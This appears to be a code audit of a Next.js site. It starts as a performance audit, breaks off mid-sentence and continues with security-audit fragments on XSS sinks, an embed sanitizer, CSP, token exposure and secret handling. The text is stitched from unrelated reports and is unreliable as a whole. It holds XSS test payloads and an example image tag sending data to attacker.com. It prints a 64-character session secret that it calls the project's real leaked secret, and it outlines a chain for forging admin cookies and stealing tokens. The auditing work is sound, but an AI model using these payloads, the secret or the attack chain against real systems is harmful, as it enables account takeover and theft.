Date: 2026 (audit run)
Scope: Performance audit of /home/z/my-project/src/ — 12 categories.
Approach: Read every file under src/ (lib, app/api/**, app/page.tsx, app/layout.tsx, app/*-login/dashboard, components/**, middleware.ts, lib/*). NO code changes made.

================================================================================
CATEGORY 1: EXPENSIVE SYNC OPS
================================================================================
1.1 [HIGH] src/components/RealOscilloscope.tsx:141  — `getComputedStyle(document.documentElement)` called INSIDE the requestAnimationFrame draw loop (~60fps). Reads 7 CSS variables per frame → forces layout recalc / style invalidation every frame. Should hoist outside the loop (only re-read on theme change). Same issue at:
     - src/components/RealSignalGenerator.tsx:123
     - src/components/LabDeviceVisualizer.tsx:57

1.2 [HIGH] src/components/LabDeviceVisualizer.tsx:50-55  — `canvas.width = w * dpr; canvas.height = h * dpr; ctx.setTransform(...)` called INSIDE the draw loop on every frame (resize happens per-frame instead of via ResizeObserver). Allocates a new backing store every frame → GC pressure + paint storms.

1.3 [MED] src/lib/settings.ts:49-54  — `incrementVisitorCount()` does `getSetting("visitorCount")` (SELECT) followed by `setSetting("visitorCount", ...)` (UPDATE). Non-atomic read-modify-write — race condition under concurrent visitors. Should use `db.siteSetting.update({where:{key}, data:{value:{increment:1}}})` or a transaction.

1.4 [MED] src/app/api/chat/route.ts:178-180  — `seedDefaultProviders()` called on EVERY chat POST. The function does `db.aiProvider.count()` per call (cheap, but unnecessary traffic on hot path). Should be a one-time init or memoized.

1.5 [MED] src/app/api/admin/text/route.ts:79-94 (bulk_set)  — Sequential `db.siteText.upsert` in a for loop. No transaction, no batch. N writes to DB. Should be wrapped in `db.$transaction([...])` or use `createMany`/upsertMany.

1.6 [MED] src/app/api/admin/equipment/route.ts:96-121 (bulk_import)  — Sequential `db.labEquipment.create` in for loop. Same pattern, no batching.

1.7 [MED] src/app/api/admin/content/route.ts:123-133 (bulk_import)  — Sequential `db.model.create` in for loop. Same pattern, no batching.

1.8 [LOW] src/app/api/chat/route.ts:204-212  — Two sequential DB writes per chat message: `chatMessage.create` (line 204) then `chatSession.update` (line 209). Should be combined in a `db.$transaction([...])` to halve round-trips.

1.9 [LOW] src/app/api/admin/stats/route.ts:16-28  — 11 parallel Prisma queries via Promise.all. SQLite is single-writer; concurrent reads open 11 connections. Acceptable, but could be reduced by combining counts into a single aggregate query.

================================================================================
CATEGORY 2: UNNECESSARY DB QUERIES
================================================================================
2.1 [HIGH] src/components/SettingsPanel.tsx:300-340  — `loadSettings()` makes 3 parallel fetches including `fetch("/api/content")`. /api/content returns ALL site data (books, articles, tutorials, skills, equipment, navItems, settings, texts from 9 DB tables — see /api/content/route.ts:11-21) just to populate name_fa/en/de, tagline_fa/en/de, handle (3-7 settings). Massive over-fetch — should hit `/api/admin/settings` only (which it already does) and include name_*/tagline_* keys.

2.2 [HIGH] src/app/api/content/route.ts:11-21  — GET /api/content fetches `db.siteText.findMany()` (no `select`) — returns ALL 3 language columns (valueEn, valueFa, valueDe) for ALL keys. The frontend (useContent.ts:48) only needs the current lang's column. 1. dangerouslySetInnerHTML  [4 occurrences]
================================================================
Locations:
  - src/app/layout.tsx:116       (font-selection boot script — static)
  - src/app/layout.tsx:130       (JSON-LD WebSite schema — JSON.stringify)
  - src/app/clips/page.tsx:57   (clip embed code)
  - src/app/page.tsx:730         (clip embed code on landing page)

Analysis:
  - layout.tsx:116-126 — inline boot script. Template literal is
    ENTIRELY static (no interpolation). Reads `localStorage.getItem
    ("site_font")` and sets an attribute on <html>. No attacker
    control over the script body. SAFE.
    * Note: `localStorage.getItem("site_font")` is attacker-readable
      AND attacker-writable in their own browser (self-XSS only).
      The value is fed to `setAttribute("data-font", font)`, NOT
      to a script sink, so it cannot execute JS even via self-XSS.

  - layout.tsx:128-143 — JSON-LD <script type="application/ld+json">.
    Uses `JSON.stringify({...})` of a STATIC object literal. Only
    `siteUrl` (env var, line 26) flows into the JSON, and only into
    a `url` field — not into a script context. SAFE.
    * JSON.stringify escapes <, >, &, U+2028, U+2029 by default in
      modern engines (>=ES2019). No </script> terminator possible
      from env var unless NEXT_PUBLIC_SITE_URL contains the literal
      sequence `</script>` — env var, not user-supplied. SAFE.

  - clips/page.tsx:57 — wraps `sanitizeEmbed(clip.embedCode)` in
    dangerouslySetInnerHTML. The clip.embedCode is admin-supplied
    (see /api/admin/clips route — stored raw, no validation), but
    `sanitizeEmbed` (sanitize-embed.ts:17-42) extracts the first
    <iframe> tag, validates its src hostname against an allowlist
    (aparat.com / youtube.com / youtu.be / player.vimeo.com), and
    rebuilds a clean iframe. SAFE *if sanitizeEmbed is correct* —
    see finding #6 for caveats.

  - page.tsx:728-731 — same pattern: `sanitizeEmbed(clip.embedCode)`
    in dangerouslySetInnerHTML. Same verdict: SAFE *if sanitizeEmbed
    is correct*.

Verdict: PASS with defense-in-depth gap in sanitize-embed.ts (#6).

          h.startsWith("mailto:") || h.startsWith("tel:")) return h;
      try {
        const u = new URL(h);
        if (u.protocol === "http:" || u.protocol === "https:") return h;
      } catch {}
      return "#";
  - ✅ Correctly rejects `javascript:alert(1)`, `data:text/html,...`,
    `vbscript:...`, and any non-URL string. Falls back to "#".
  - The href is then placed on <a href={safeHref} ...> (line 491).
  - SAFE at render time.

API storage (defense-in-depth gap):
  - src/app/api/admin/nav/route.ts:34-39 (create) — `href: String(d.href || "#")`
    No scheme validation. An admin (or anyone with admin creds via the
    middleware-bypass path noted in V17.3-SEC-02 Q3/F-1) can store a
    `javascript:alert(document.cookie)` href. The DB persists it.
  - src/app/api/admin/nav/route.ts:42-47 (update) — uses raw `{...body.data}`
    without ANY field-name validation. Even worse than create: arbitrary
    fields can be written to the NavItem record (e.g., the `target` field
    could be set to a non-_blank/_self value, though React clamps it).
  - The render-time check at page.tsx:478-487 prevents the stored
    `javascript:` URL from being assigned to a real <a href> on the
    public page. ✅ Active protection works.
  - HOWEVER: NavMenuManager.tsx:125 renders `{item.href}` in a <span>
    (text node, auto-escaped by React). Safe.
  - Defense-in-depth gap: if any future code path renders `navItem.href`
    without re-validating (e.g., a future JSON-LD property, an email
    template, an RSS feed), the stored payload executes. SHOULD be
    validated at the API on write.

Cross-reference: prior audit V17.4-SEC-12 F-A (chat Map leak) and
  V17.3-SEC-02 Q3/F-1 (middleware session-format-only check). The
  middleware lets a forged-cookie-shape request through to /api/admin/*
  routes; the API layer does verify HMAC (admin-auth.ts:17-31 →
  access-auth.ts:78-96). So an attacker without admin creds CANNOT
  store a malicious href. But an attacker WITH admin creds (e.g.,
  via the V17.3-SEC-02 Q4/F-5 missing rate limit on /api/admin/*
  → admin password brute-force) can.

Verdict: PASS (active) with defense-in-depth gap (stored unsanitized).

6. sanitize-embed.ts  [PASS with edge cases]
================================================================
File: src/lib/sanitize-embed.ts:17-42

Algorithm:
  1. Match first <iframe ...> tag via `/<iframe[^>]*>/i` (line 19).
     If none, return "" (safe empty).
  2. Extract `src` attribute value via `/src=["']([^"']*)["']/i`
     (line 25). The character class `[^"']*` excludes BOTH `"` and
     `'`, so an attacker CANNOT break out of the src attribute by
     including a quote character.
  3. Parse src as URL via `new URL(src)` (line 32).
  4. Reject if `url.hostname` not in ALLOWED_DOMAINS (lines 8-15):
       aparat.com, www.aparat.com, youtube.com, www.youtube.com,
       youtu.be, player.vimeo.com
  5. Rebuild a clean iframe: `<iframe src="${src}" frameborder="0"
     allowfullscreen style="..."></iframe>` (line 41).

Strengths:
  - ✅ `javascript:` URLs are rejected: `new URL("javascript:alert(1)")`
    parses but `url.hostname` is empty string, which is NOT in the
    allowlist.
  - ✅ `data:` URLs rejected for same reason (empty hostname).
  - ✅ Hostname comparison is case-insensitive (URL.hostname is
    lowercased by the URL parser).
  - ✅ Subdomain spoofing rejected: `https://aparat.com.evil.com/`
    has hostname `aparat.com.evil.com`, not in allowlist.
  - ✅ Userinfo trick rejected: `https://aparat.com@evil.com/` has
    hostname `evil.com`, not in allowlist.
  - ✅ The rebuild drops ALL other attributes (onload, onerror,
    sandbox, allow-same-origin, etc.) — only src, frameborder,
    allowfullscreen, style are present in the output.
  - ✅ A payload like
    `<iframe src="https://aparat.com/x"></iframe><script>alert(1)</script>`
    is safe: the regex matches only the first `<iframe ...>`, the
    `</iframe>` and trailing `<script>` are not in the regex output
    and are not emitted into the rebuild.

Edge cases / weaknesses (LOW severity):
  - (a) src not HTML-attribute-encoded on output (line 41): the
    rebuild does `<iframe src="${src}" ...>`. The `src` is captured
    by `[^"']*` so it cannot contain `"` or `'`, BUT it CAN contain
    `>`. A URL like `https://aparat.com/v/x?foo=>bar` would produce:
      <iframe src="https://aparat.com/v/x?foo=>bar" frameborder="0" ...>
    The browser parses the first `>` (inside the URL value) as the
    end of the iframe tag. The remaining `bar" frameborder="0"
    allowfullscreen style="...">` becomes attributes on a phantom
    element OR text content. Since the attacker cannot inject `"`
    (excluded by `[^"']*`), they cannot inject arbitrary attributes
    like `onload`. The worst case is broken HTML rendering. LOW.
    Fix: `src.replace(/[<>&"]/g, ...)` before interpolation. Or
    construct via DOM API.

  - (b) Allowlist allows http: AND https: — `new URL("http://aparat.com/x")`
    parses with hostname `aparat.com` and is accepted. A man-in-the-
    middle could swap the http: response. The site itself is served
    over https per middleware HSTS (middleware.ts:212), but the iframe
    content from http://aparat.com would be loaded over HTTP. MITM
    could inject content into the iframe. LOW (depends on attacker
    positioning).

  - (c) No length cap on `input` — a 10MB embed code string would
    be parsed by the regex. The regex `[^>]*` is greedy but bounded
    by the first `>`, so it only captures up to the end of the first
    iframe tag. No ReDoS risk (no nested quantifiers). LOW.

  - (d) No path/query validation — any path on the allowed domains
    is permitted. Not a security issue, just functional.

Verdict: PASS. No exploitable XSS vector found. Edge case (a) is
  the closest to a real issue but is not exploitable due to the
  `[^"']*` constraint. Defense-in-depth: should HTML-encode the src
  on output.

10. CSP unsafe-inline/eval  [FAIL — defense-in-depth gap]
================================================================
Location: src/middleware.ts:111-133

The CSP directive:
  const CSP = [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://www.google.com https://www.gstatic.com",
    "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
    "font-src 'self' data: https://fonts.gstatic.com",
    "img-src 'self' data: blob: https:",
    "frame-src 'self' https://www.google.com https://www.gstatic.com https://www.aparat.com https://aparat.com https://www.youtube.com https://youtube.com https://youtu.be https://player.vimeo.com",
    "connect-src 'self' https://www.google.com https://www.gstatic.com",
    "object-src 'none'",
    "base-uri 'self'",
    "form-action 'self' https://formsubmit.co",
    "frame-ancestors 'none'",
  ].join("; ");

Critical issues:
  - (a) `script-src` includes BOTH `'unsafe-inline'` AND `'unsafe-eval'`
    (line 114). This combination DEFEATS the XSS protection that CSP
    is supposed to provide:
      * `'unsafe-inline'` allows ANY inline <script>...</script> tag,
        inline event handlers (onclick=...), inline <svg onload=...>,
        and javascript: URLs (if not blocked elsewhere) to execute.
      * `'unsafe-eval'` allows `eval()`, `new Function()`, `setTimeout
        ("string")`, `setInterval("string")` — all of which can be
        used by attacker-injected code to dynamically evaluate
        payloads.
    If any XSS vector exists (or is introduced in the future) anywhere
    on the site, CSP provides NO protection. The combination is
    strictly worse than either alone.

  - (b) `style-src 'unsafe-inline'` (line 116) — allows inline style
    attributes and <style> tags. Less severe than script-src
    'unsafe-inline' (CSS cannot execute JS, but can be used for CSS
    injection: exfiltration via background-url, content manipulation,
    clickjacking via opacity). Acceptable trade-off given Next.js
    relies on inline styles.

  - (c) `img-src 'self' data: blob: https:` (line 120) — the `https:`
    wildcard allows images from ANY https origin. An attacker who can
    inject an <img src="https://attacker.com/track?cookie=..."> (which
    they can if any XSS exists, or even via the `<img>` in the
    Markdown-rendered Bale message — wait, that's not this site) can
    exfiltrate data. Wider than necessary; should be `'self' data:
    blob: https://www.google.com https://www.gstatic.com` (or a
    domain allowlist).

  - (d) `connect-src 'self' https://www.google.com https://www.gstatic.com`
    (line 124) — does NOT include the LLM provider endpoints (api.
    openai.com, api.anthropic.com, api.groq.com, localhost:11434 for
    Ollama, or the admin-configured custom baseUrl). This means
    client-side fetches to those endpoints would be BLOCKED by CSP.
    In practice, the LLM calls are server-side (route.ts → providers.ts),
    so this is not an issue. But if any client-side fetch to LLM
    providers were added, it would silently fail. Informational only.

  - (e) `form-action 'self' https://formsubmit.co` (line 130) — good.
    Prevents form submissions to attacker-controlled origins.

  - (f) `frame-ancestors 'none'` (line 132) — equivalent to X-Frame-
    Options: DENY. Good. Prevents clickjacking. (Note:
    middleware.ts:100 also sets X-Frame-Options: DENY — redundant but
    harmless.)

  - (g) `object-src 'none'` (line 126) — good. Blocks Flash/Java
    plugins.

  - (h) `base-uri 'self'` (line 128) — good. Prevents <base href>
    hijack.

Justification for 'unsafe-inline' (likely reason):
  - Next.js App Router emits many inline <script> blocks for
    hydration, font preloading, and route metadata. Without a per-
    request nonce (which Next.js supports but requires config), the
    app would break if 'unsafe-inline' were removed. This is a known
    limitation of Next.js without nonce configuration.

Justification for 'unsafe-eval' (likely reason):
  - Next.js dev mode uses eval for source maps / HMR. In production,
    Next.js generally does NOT need 'unsafe-eval'. This is likely
    a copy-paste from a dev-time CSP that was never tightened for
    production. SHOULD be removed in production.

Risk assessment:
  - No active XSS vector found in this audit (all user input is
    rendered via React text nodes). So 'unsafe-inline' + 'unsafe-
    eval' do not currently enable an exploit.
  - HOWEVER: the CSP provides ZERO defense-in-depth. If an XSS
    vector is introduced in the future (e.g., a new component uses
    dangerouslySetInnerHTML, or a markdown renderer is added for
    chat messages), the CSP will NOT block execution.
  - The CSP should be tightened to use a per-request nonce (Next.js
    supports this via `headers()` and `next.config.js`). At minimum,
    'unsafe-eval' should be removed from the production CSP.

Verdict: FAIL on defense-in-depth. PASS on active protection
  (because no active XSS vector exists to exploit the weakness).

----- F-A. /api/admin/settings POST "get_telegram" leaks raw token [MED] -----
Location: src/app/api/admin/settings/route.ts:29-41

Code:
  if (action === "get_telegram") {
    const [token, chatId, enabled] = await Promise.all([
      getSetting("telegramBotToken"),
      ...
    ]);
    return NextResponse.json({
      ok: true,
      telegramBotToken: token,     ← RAW, UNMASKED
      ...
    });
  }

Analysis:
  - The V17.4 fix (lines 130-135) masks baleBotToken and telegramBotToken
    in the GET handler by replacing the value with "••••••••" + last 4.
  - HOWEVER, the POST `action: "get_telegram"` (lines 29-41) returns
    the FULL raw token. Any admin (or anyone with admin creds) can
    retrieve the unmasked Telegram bot token via:
      POST /api/admin/settings
      { "password": "...", "action": "get_telegram" }
  - The response body contains `telegramBotToken: "<full plaintext>"`.
  - With the token, an attacker can:
      * Send arbitrary messages as the bot to any chat the bot is in.
      * Set a new webhook URL → receive all future inbound messages.
      * Read bot metadata (name, username, owner via /getMe).
  - Same issue likely intended for "get_bale" but no such action
    exists for Bale (Bale uses the bulk-settings endpoint, which is
    already masked). Telegram has its own dedicated endpoint here.

Cross-reference: V17.4 fix (worklog lines ~63080-63082) only patched
  GET. This POST action bypasses the fix. NEW finding (not in prior
  audits).

Severity: MED (admin-only, but defeats the V17.4 masking intent).

----- F-B. /api/admin/nav update accepts arbitrary fields [LOW] -----
Location: src/app/api/admin/nav/route.ts:42-47

Code:
  case "update": {
    const id = String(body.id || "");
    if (!id) return NextResponse.json({ ok: false, error: "missing_id" }, { status: 400 });
    const d = { ...body.data }; delete d.id; delete d.createdAt; delete d.updatedAt;
    const item = await db.navItem.update({ where: { id }, data: d });
    return NextResponse.json({ ok: true, item });
  }

Analysis:
  - `body.data` is spread into `d` and passed STRAIGHT to Prisma's
    `update({ data: d })`. Only id/createdAt/updatedAt are stripped.
  - An admin can write arbitrary fields to the NavItem record (e.g.,
    `data: { href: "javascript:alert(1)", arbitraryField: "x" }`).
    Prisma will reject unknown fields (strict mode) BUT any field
    in the NavItem schema is accepted without type validation.
  - For `href`, no scheme check → can store `javascript:alert(1)`.
    Render-time check at page.tsx:478-487 prevents execution, but
    the bad value is persisted.
  - Same pattern in /api/admin/content (route.ts:88-97) and
    /api/admin/themes (route.ts:74-81) and /api/admin/equipment
    (route.ts:63-73). All admin update endpoints pass raw body.data
    to Prisma.

Severity: LOW (admin-only, render-time defense works for known
  fields). Defense-in-depth gap.

  - Disables right-click, F12, Ctrl+Shift+I/J, Ctrl+U, Ctrl+S.
  - These are UX features, not security boundaries (the page source
    is still accessible via curl, browser menu, etc.). No security
    impact, but it inconveniences legitimate users (including the
    admin during development).
  - The DevTools detection uses a 160px threshold, which can be
    bypassed by docking DevTools to the side (vertical dock causes
    height diff > 160 only if docked at >160px height — easy to
    avoid by using the bottom dock at 100px height, which is below
    the threshold). Easily bypassed.
  - Not a vulnerability. Informational only.

----- F-D. CSP `img-src https:` wildcard [LOW] -----
Location: src/middleware.ts:120

Code:
  "img-src 'self' data: blob: https:",

Analysis:
  - Allows images from ANY https origin. If an XSS vector is ever
    introduced, an attacker can exfiltrate data via:
      <img src="https://attacker.com/leak?data=...">
    The CSP will not block this.
  - Should be tightened to an allowlist: `'self' data: blob:
    https://www.google.com https://www.gstatic.com` (matching the
    script-src / frame-src allowlist for reCAPTCHA).

Severity: LOW (defense-in-depth).

Q4. SESSION_SECRET entropy check
----------------------------------------------------------------
Status: PARTIAL FAIL  | Severity: MED
Evidence: /home/z/my-project/src/lib/access-auth.ts:21-43

  28:   const KNOWN_BAD_SECRETS = new Set([
  29:     "build-placeholder",
  30:     "change-me",

  36:   if (KNOWN_BAD_SECRETS.has(s) || s.length < 32) {

  39:     );
  40:   }
  41:   _SECRET = s;
  42:   return _SECRET;
  43: }

Strengths:
  - Rejects empty / undefined secret ✅
  - Rejects secrets shorter than 32 chars ✅
  - Rejects 6 known-bad placeholder strings ✅
  - Throws synchronously at first secret access (no silent fallback) ✅
  - Memoizes `_SECRET` after first read (avoids re-reading env per request) ✅
  - install.sh:99-111 regenerates with `openssl rand -hex 32` (64 hex
    chars = 256 bits entropy) ✅
  - install.sh:101 also rejects existing weak `"build-placeholder"`
    value before re-use ✅

Weaknesses:
  - KNOWN_BAD_SECRETS list is INCOMPLETE. Historical placeholders
    NOT in the blocklist (all are public in git history — see Q11)
    AND pass the `s.length >= 32` check:
      * `"build-placeholder-use-openssl-rand-hex-32"` (40 chars)
        — commit b15f515 (V16.0 FINAL). Would PASS the check.
      * `"build-time-placeholder-change-in-production"` (42 chars)
        — commit 3bd0327 (V13). Would PASS the check.
      * `"change-this-to-a-random-secret-in-production"` (45 chars)
        — commits f21f9e6, d486cb2 (V3, V19.4). Would PASS the check.
    If anyone deploys with these (e.g., copies from old git history
    instead of running install.sh), the runtime check passes silently
    but the secret is publicly known. [MED — defense-in-depth gap]
  - No entropy estimation (Shannon / character-class check). A
    32-char secret of all `a`s would pass.
  - No comparison against the leaked real secret
    `2777b3945b574cf13feaa1c49a181009702519b3fa3f62c6063a7b10d0a4682b`
    (which IS 64 hex chars and would PASS the check). If this secret
    is ever accidentally restored from git history into a fresh
    .env, the runtime would happily use it.
  - `getSecret()` only called from `hmac()` (access-auth.ts:206),
    which is called by `createSessionToken` (line 67) and
    `verifySessionToken` (line 88). If neither is invoked at boot,
    the secret is not validated until the first request — startup
    succeeds even with a bad secret, then 500s on first session
    operation. Defense-in-depth gap: a boot-time self-test would
    surface misconfigurations earlier.
  - The error message is the same for "missing" and "weak" cases,
    obscuring which check fired during debugging.

Cross-reference: prior audit V17.3-SEC-01 (per worklog line 890)
recommended the entropy check; current implementation is the
follow-up. This audit recommends extending the blocklist and
adding boot-time validation. NOT FIXED per task instructions.

  20:     const expectedSecret = process.env.BALE_WEBHOOK_SECRET;
  21:     if (!expectedSecret) {
  22:       return NextResponse.json({ ok: false, error: "webhook_not_configured" }, { status: 503 });
  23:     }
  24:     // Constant-time comparison
  25:     const secretBuf = Buffer.from(secret);
  26:     const expBuf = Buffer.from(expectedSecret);
  27:     if (secretBuf.length !== expBuf.length || !crypto.timingSafeEqual(secretBuf, expBuf)) {
  28:       return NextResponse.json({ ok: false, error: "invalid_secret" }, { status: 403 });
  29:     }

Checklist:
  - Secret required (503 if not configured) ✅ both routes
  - Secret accepted from URL query OR X-Webhook-Secret header ✅
  - Length check BEFORE timingSafeEqual (prevents range-error on
    mismatched Buffer lengths) ✅
  - crypto.timingSafeEqual used (constant-time comparison, prevents
    timing side-channel) ✅
  - 403 on mismatch (not 401, which would hint at user-existence) ✅
  - install.sh:113-125 generates both BALE_WEBHOOK_SECRET and
    TELEGRAM_WEBHOOK_SECRET via `openssl rand -hex 16` (128 bits
    entropy each), idempotent on re-run ✅

Defense-in-depth gap (LOW, informational):
  - Secret in URL query string gets logged in NGINX access logs and
    in proxy upstream logs (Caddyfile, nginx-ehsanmorad.conf). A
    compromised log aggregator would recover the webhook secret.
    Mitigation: prefer the X-Webhook-Secret header over the URL
    query parameter. The code accepts both; documentation/install.sh
    output uses URL form (install.sh:332-336).
  - No replay protection (no nonce / timestamp). A captured valid
    request can be replayed within the secret's lifetime. Not
    critical for admin-bot webhooks where Bale/Telegram are the
    only callers, but worth noting.

No encrypt() call anywhere in the write path. apiKey is stored
verbatim as received from the admin client.

Consequence:
  - Anyone with read access to the SQLite file at `db/custom.db`
    (e.g., via SQL injection, file-system compromise, or a backup
                leak — see auto-backup.sh which copies db/custom.db to
    /app/backups/db_*.db.gz without encryption) recovers all AI
    provider API keys in cleartext.
  - The masking in providers/route.ts:29
    (`apiKey: p.apiKey ? "••••••••" + p.apiKey.slice(-4) : null`)
    is purely cosmetic — it only hides the key from the admin UI,
    not from the DB. The masked value is what the admin SEES; the
    plaintext is what the server USES.

Recommendation (advisory only — DO NOT FIX per task): implement
AES-256-GCM encryption with a key derived from SESSION_SECRET
(or a dedicated ENCRYPTION_KEY env var). Update both read and
write paths. Fix the misleading schema comment.

Q9. Secrets in console.error?
----------------------------------------------------------------
Status: PARTIAL PASS (with defense-in-depth caveat) | Severity: LOW
Evidence: 38 console.error call sites in src/

Inventory of console.error locations (full list from grep):
  - src/lib/providers.ts:63 — `[LLM] Provider ${provider.label} failed:`, err
  - src/lib/telegram.ts:35 — `[telegram] sendMessage error:`, err
  - src/lib/bale.ts:61 — `[bale] sendMessage error:`, err
  - src/lib/access-auth.ts:168 — `Failed to log access:`, e
  - 22 admin API routes (clips, content, equipment, nav, providers,
    reply, security, security-dashboard, settings, text, themes,
    users, email, chat-reply, clear) — generic `error:`, err
  - 4 public API routes (chat, contact, clips, messages) — generic
  - 1 user login route (login/route.ts:125) — `Login error:`, e
  - 2 webhook routes (bale, telegram) — generic
  - 2 Next.js error boundaries (error.tsx:7, global-error.tsx:7)

Direct secret logging analysis:
  - NONE of the console.error calls explicitly log a named secret
    field (no `console.error("apiKey:", apiKey)`, no
    `console.error("token:", token)`, etc.).
  - All error logs use the pattern `console.error("<prefix>:", err)`
    where `err` is the caught exception object. Node's default
    Error.toString() returns `Error: <message>`, which by default
    does NOT include arbitrary object properties (apiKey, token).

Indirect leak risk (LOW, defense-in-depth):
  - providers.ts:63 logs the error thrown by callOpenAI (line 115),
    callAnthropic (line 143), callGroq (line 187), callOllama
    (line 163):
      `throw new Error(\`OpenAI API error: ${res.status} ${err}\`)`
    where `err` is `await res.text()` (the upstream response body).
    - OpenAI / Groq: apiKey sent as `Authorization: Bearer <key>`
      header (providers.ts:104, 176). Upstream APIs do NOT echo
      Authorization headers in error bodies → no leak.
    - Anthropic: apiKey sent as `x-api-key: <key>` header
      (providers.ts:131). Anthropic's API does NOT echo x-api-key
      in error bodies → no leak.
    - HOWEVER: if an admin configures a malicious baseUrl (see
      prior audit V17.5-SEC-12 Q9 — SSRF finding), the attacker-
      controlled upstream CAN return a response body containing
      any text, including the value of any header it received.
      If the attacker's server logs the Authorization header and
      then echoes it back in a 200/4xx response body, that body
      becomes the `err` thrown by callOpenAI, which is then
      console.error'd by providers.ts:63. The Authorization value
      (containing the apiKey) would then appear in the server
      logs. This is a chained attack requiring admin access to
      configure baseUrl — covered by V17.5-SEC-12, not a new
      finding here.

  - chat/route.ts:189 logs `[LLM] Provider ${provider.label}
    failed:`, err — same risk as providers.ts:63 (the error
    propagates up). Covered above.

  - No Prisma error messages include row data (verified by inspecting
    the catch blocks — none use `JSON.stringify(err)` or
    `err.cause` which would expand nested fields).

Verdict: PASS for direct logging. Defense-in-depth gap: no
redaction filter for upstream error bodies that might contain
echoed secrets (low risk under normal operation, elevated risk
in combination with the SSRF finding in V17.5-SEC-12 Q9).

Recommendation (advisory only): truncate upstream error bodies
to 200 chars before throwing/logging in providers.ts:115, 143,
163, 187. Never include `Authorization` / `x-api-key` header
values in any error string.

================================================================
ROOT-CAUSE ANALYSIS
================================================================

The project has three independent secret-management problems:

1. SECRET HYGIENE AT REST (Q6, Q7):
   No encryption layer exists for sensitive columns. The schema
   comments lie ("Encrypted API key", "Encrypted password"). All
   secrets live as plain String in SQLite. The fix is mechanical:
   add an encrypt()/decrypt() pair (AES-256-GCM) and route all
   reads/writes through it. This has been flagged in 4+ prior
   audits (V17.2-SEC-06, V17.4-SEC-13, V17.5-SEC-04) and remains
   unfixed.

2. SECRET EXPOSURE IN API RESPONSES (Q8):
   Even with no encryption at rest, secrets could be masked in
   responses (cosmetic-only protection). V17.4-FINAL (worklog:63071)
   partially fixed this for GET /api/admin/settings and
   GET /api/admin/providers. But three admin-gated endpoints still
   return plaintext (or embedded-in-URL) secrets:
     - POST /api/admin/settings action=get_telegram (route.ts:35-40)
     - POST /api/admin/providers create/update/toggle (route.ts:71,94,119)
     - GET /api/bale/webhook (route.ts:73-75)
   The V17.4 fix was incomplete; these were missed.

3. SECRET LEAKAGE IN GIT HISTORY (Q11):
   The real SESSION_SECRET `2777b3...` was committed in V17.1 and
   remains in the git object database across at least 2 commits.
   Even though .env was eventually untracked (V17.2 commit b152d33
   removed it), the historical blobs persist. The same secret is
   ALSO embedded in worklog.md itself at 6 separate lines — a
   second independent leak vector. Any history rewrite must
   address BOTH the .env blobs AND the worklog.md text references.
   Additionally, db/custom.db was committed in 5 historical
   commits with potential admin bcrypt hashes (not exhaustively
   inspected here).

These three problems compound:
   - Q11 leak (real SESSION_SECRET) → forge access_session cookie
     with valid HMAC signature.
   - Q4 partial entropy check (real secret passes) → no runtime
     detection of the leaked secret being used.
   - Middleware format-only session check (prior audit V17.3-SEC-02
     Q3 still open) → forged cookie reaches admin API routes.
   - Q8 plaintext leaks (c, d, e) → attacker recovers all bot
     tokens + AI keys via 3 admin-gated endpoints.
   - Q6/Q7 no encryption at rest → once DB is compromised, all
     secrets recovered instantly (no second factor).

  F1.1 [LOW] text/route.ts:18-25 returns PUBLIC shape (string-only) when auth
        fails — `{ ok:true, texts: Record<string, string> }`. text/route.ts
        :29-34 returns ADMIN shape (objects) when auth passes —

----- 24. StatsDashboard.tsx:11 — GET /api/admin/stats?password=... [CRIT] -----
  Code: const res = await fetch(`/api/admin/stats?password=${password}`);
  F24.1 [CRIT, BROKEN-AUTH] NO `credentials:"include"`. Browser will NOT
        send the access_session cookie. admin-auth.ts:17-31 reads ONLY the
        cookie (password arg is ignored). stats/route.ts:9-11 calls
        checkAdminAuth which returns ok:false because no cookie. Endpoint
        returns 401 `{ok:false, error:"unauthorized"}`.
  F24.2 [CRIT, PWD-IN-URL] `password` query param is logged in:
          - browser history
          - server access logs (NGINX/Next.js)
          - referrer header if user navigates away
          - any analytics middleware
        Even though backend IGNORES it (V17.2 removed fallback), the
        secret still leaks. If the admin typed their password into the
        `password` prop (passed from parent), it's now in plaintext URL
        logs forever.
  F24.3 [MED] catch at L14 is `{}`. Silent failure.
  F24.4 [MED] No `data.ok === false` check.
  F24.5 [LOW] No per-action loading state on refresh button (L108).

================================================================================
SECTION D — Cross-cutting findings (matrix aggregates)
================================================================================

D1. credentials:"include" coverage
    - 30/33 calls include credentials. ✅
    - 3/33 missing: StatsDashboard.tsx:11, SecurityDashboard.tsx:11,
      SecurityDashboard.tsx:26, SecurityDashboard.tsx:35. All four are
      in DEAD CODE components (no import found in /src). They will ALL
      fail 401 in production regardless of password being correct,
      because admin-auth.ts:17-31 reads cookie only.

D2. password leakage
    - StatsDashboard.tsx:11 — `?password=${password}` in URL. CRIT.
    - SecurityDashboard.tsx:11 — same. CRIT.
    - SecurityDashboard.tsx:26 — `{ password, action:"unblock", ip }`
      in POST body. CRIT.
    - SecurityDashboard.tsx:35 — `{ password, action:"clear_logs" }` in
      POST body. CRIT.
    - AccessUserManager.tsx:155 — `{ password: form.password || undefined }`
      in POST body. ✅ ACCEPTABLE: this is the new user's password being
      SET (not admin auth credential), hashed at users/route.ts:104.
    - SettingsPanel.tsx changePassword L390-394 — sends `currentPassword`
      + `newPassword` in POST body. ✅ ACCEPTABLE: admin's old/new
      password for change-password flow. Backend security/route.ts:76-91
      verifies old, hashes new. Travels plaintext unless HTTPS — site
      operator's responsibility to enable HTTPS (assumed).
    - All other 26 calls correctly rely on cookie only. ✅

D3. Response-shape inspection gaps (CRITICAL pattern)
    - 11/33 calls do NOT inspect `data.ok` and do NOT handle the
      `{ok:false, error}` envelope at all. These silently succeed on
      failure:
        TextEditor.tsx:32, ThemeBuilder.tsx:88/103/112, NavMenuManager
        .tsx:37/48/57/73/76, AparatClipManager.tsx:91, SettingsPanel.tsx:
        303/304/305/350.
    - 4/33 calls inspect only success and rely on a catch for failure
      (loadItems pattern): TextEditor.tsx:17, ThemeBuilder.tsx:66,
      NavMenuManager.tsx:16.
    - 8/33 calls properly map backend error codes to localized user
      messages: AparatClipManager.tsx:43/68, AccessUserManager.tsx:87/
      171/203, SettingsPanel.tsx:390 (changePassword only), user-
      dashboard/page.tsx:366/382/407 (partial).

D4. Network error handling
    - 7/33 calls have NO try/catch at all: TextEditor.tsx:32,
      NavMenuManager.tsx:37/48/57/73/76, ThemeBuilder.tsx:103/112,
      SecurityDashboard.tsx:26/35. Unhandled promise rejection on
      network error.
